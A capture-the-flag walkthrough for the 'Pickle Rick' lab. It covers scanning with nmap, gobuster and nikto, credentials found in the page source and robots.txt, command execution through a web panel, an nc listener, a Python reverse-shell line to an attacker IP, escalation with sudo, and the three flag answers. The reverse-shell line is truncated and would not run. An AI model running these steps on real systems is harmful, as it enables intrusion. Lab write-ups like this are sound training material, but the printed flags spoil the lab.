# Pickle Rick

```
export IP=10.10.155.70
```

## Intial nmap scan
```
nmap -sC -sV -oN nmap/initial 10.10.155.70
```

https://10-10-155-70.p.thmlabs.com/
### View source
```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

## Dirbuster
```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py

/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882] 
/assets               (Status: 301) [Size: 313] [--> http://10.10.155.70/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]                   
/robots.txt           (Status: 200) [Size: 17]             

```
[portal.php](https://10-10-155-70.p.thmlabs.com/portal.php) --REDIRECTS-->>
[login.php](https://10-10-155-70.p.thmlabs.com/login.php)


## Nikto
```
nikto -h http://10.10.155.70 | tee nikto.log
```
https://10-10-155-70.p.thmlabs.com/robots.txt

`Wubbalubbadubdub`

## Credentials
Username: `R1ckRul3s`

Password: `Wubbalubbadubdub`

## We're in!!
```
ls
cat Sup3rS3cretPickl3Ingred.txt
*Command disabled to make it hard for future PICKLEEEE RICCCKKKK.*

while read line; do echo $line; done < clue.txt
*Look around the file system for the other ingredient.*

grep . Sup3rS3cretPickl3Ingred.txt
```
`mr. meeseek hair`

https://10-10-155-70.p.thmlabs.com/portal.php
## View source
```
```

## On attack box
```
nc -lnvp 9999
```
## Pentest Monkey Reverse Shell Cheat Sheet
`https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`

*Python*

*This was tested under Linux / Python 2.7:*
```

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.7.164",9999))
```

## We have a shell!
```
sudo bash
cat /home/rick/*
```
`jerry tear`
```
cat /home/3rd.txt
```
`fleeb juice`


